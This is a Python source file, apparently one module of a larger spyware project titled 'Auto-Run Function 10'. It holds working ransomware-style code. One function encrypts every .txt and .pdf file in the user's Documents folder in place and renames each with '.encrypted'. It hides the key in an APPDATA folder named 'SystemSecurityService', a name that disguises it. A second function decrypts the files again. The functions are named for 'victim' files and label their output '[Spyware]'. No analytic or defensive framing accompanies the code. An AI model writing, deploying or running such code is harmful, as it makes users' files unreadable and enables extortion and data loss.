"""Auto-Run Function 10"""
import os
from cryptography.fernet import Fernet
import json
from datetime import datetime

def encrypt_victim_files():
    print("[Spyware] Function 10: Starting...")
    try:
        encryption_key = Fernet.generate_key()
        cipher = Fernet(encryption_key)
        docs_folder = os.path.join(os.path.expanduser('~'), 'Documents')
        encrypted_files = []
        total_encrypted = 0
        target_extensions = ['.txt', '.pdf']
        if not os.path.exists(docs_folder):
            return {'encrypted_files': [], 'key': encryption_key.decode(), 'total_encrypted': 0}
        print(f"[Spyware] Scanning: {docs_folder}")
        for file in os.listdir(docs_folder):
            file_path = os.path.join(docs_folder, file)
            if not os.path.isfile(file_path):
                continue
            file_ext = os.path.splitext(file)[1].lower()
            if file_ext in target_extensions:
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    encrypted_data = cipher.encrypt(file_data)
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_data)
                    encrypted_path = file_path + '.encrypted'
                    os.rename(file_path, encrypted_path)
                    encrypted_files.append(encrypted_path)
                    total_encrypted += 1
                    print(f"[Spyware] Processed: {file}")
                except Exception as e:
                    print(f"[Spyware] Failed: {file} - {e}")
        encryption_data = {'key': encryption_key.decode(), 'encrypted_files': encrypted_files, 'total_encrypted': total_encrypted, 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        appdata = os.getenv('APPDATA')
        key_folder = os.path.join(appdata, 'SystemSecurityService')
        os.makedirs(key_folder, exist_ok=True)
        key_file = os.path.join(key_folder, 'encryption_data.json')
        with open(key_file, 'w') as f:
            json.dump(encryption_data, f, indent=2)
        print(f"\n[Spyware] Complete: {total_encrypted} files")
        print(f"[Spyware] Key: {encryption_key.decode()}")
        return encryption_data
    except Exception as e:
        print(f"[Spyware] Error: {e}")
        return {'encrypted_files': [], 'key': 'ERROR', 'total_encrypted': 0}

def decrypt_victim_files(encryption_key):
    print("[Spyware] Decrypting...")
    try:
        if isinstance(encryption_key, str):
            encryption_key = encryption_key.encode()
        cipher = Fernet(encryption_key)
        appdata = os.getenv('APPDATA')
        key_file = os.path.join(appdata, 'SystemSecurityService', 'encryption_data.json')
        if not os.path.exists(key_file):
            print("[Spyware] No data found")
            return 0
        with open(key_file, 'r') as f:
            encryption_data = json.load(f)
        encrypted_files = encryption_data.get('encrypted_files', [])
        decrypted_count = 0
        for encrypted_path in encrypted_files:
            if not os.path.exists(encrypted_path):
                continue
            try:
                with open(encrypted_path, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = cipher.decrypt(encrypted_data)
                original_path = encrypted_path.replace('.encrypted', '')
                with open(original_path, 'wb') as f:
                    f.write(decrypted_data)
                os.remove(encrypted_path)
                decrypted_count += 1
                print(f"[Spyware] Restored: {os.path.basename(original_path)}")
            except Exception as e:
                print(f"[Spyware] Failed: {e}")
        print(f"\n[Spyware] Restored {decrypted_count} files")
        return decrypted_count
    except Exception as e:
        print(f"[Spyware] Error: {e}")
        return 0
